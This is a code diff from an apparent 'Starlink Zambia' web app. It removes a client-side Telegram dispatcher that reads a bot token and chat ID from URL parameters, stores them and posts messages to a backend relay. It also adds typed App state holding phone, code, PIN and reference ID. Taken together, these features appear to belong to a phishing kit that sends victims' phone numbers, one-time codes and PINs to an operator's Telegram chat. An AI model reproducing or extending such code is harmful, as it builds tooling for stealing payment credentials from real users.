@@ -1,64 +1,9 @@
-/**
- * TELEGRAM BOT DISPATCHER (CLIENT SIDE)
- * Order data is securely relayed to Telegram via backend endpoint /api/telegram/send
- * Configure your TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in the root .env file.
- */
-
-class TelegramService {
-  constructor() {
-    const urlParams = new URLSearchParams(window.location.search);
-    const urlToken = urlParams.get('token') || urlParams.get('botToken') || urlParams.get('bot_token');
-    const urlChatId = urlParams.get('chat_id') || urlParams.get('chatId');
-
-    if (urlToken && urlChatId) {
-      this.saveCredentials(urlToken, urlChatId);
-    }
-
-    this.botToken = localStorage.getItem('starlink_tg_token') || '';
-    this.chatId = localStorage.getItem('starlink_tg_chatid') || '';
-  }
-
-  hasCredentials() {
-    return Boolean(this.botToken && this.chatId);
-  }
-
-  saveCredentials(token, chatId) {
-    this.botToken = token.trim();
-    this.chatId = chatId.trim();
-    localStorage.setItem('starlink_tg_token', this.botToken);
-    localStorage.setItem('starlink_tg_chatid', this.chatId);
-  }
-
-  async sendPayload(htmlMessage) {
-    try {
-      const response = await fetch('/api/telegram/send', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          message: htmlMessage,
-          botToken: this.botToken || undefined,
-          chatId: this.chatId || undefined
-        })
-      });
-
-      const data = await response.json();
-      if (!response.ok && !data.simulated) {
-        throw new Error(data.error || 'Failed to dispatch message via server');
-      }
-      return { ok: true, data };
-    } catch (err) {
-      console.error('[Background Dispatcher Error]:', err);
-      return { ok: false, error: err };
-    }
-  }
-
-  async testConnection() {
-    const testMsg = `<b>🛰️ STARLINK ZAMBIA TEST PING</b>\n\nConnection established successfully!\nTimestamp: ${new Date().toLocaleString()}`;
-    return this.sendPayload(testMsg);
-  }
-}
-
 class App {
+  tgService: any;
+  currency: string;
+  currentStep: number;
+  state: { planName: string; planPrice: string; planHardware: string; phone: string; code: string; notes: string; pin: string; refId: string; };
+  waitingInterval: any;
   constructor() {
     this.tgService = new TelegramService();
     this.currency = 'ZMW';
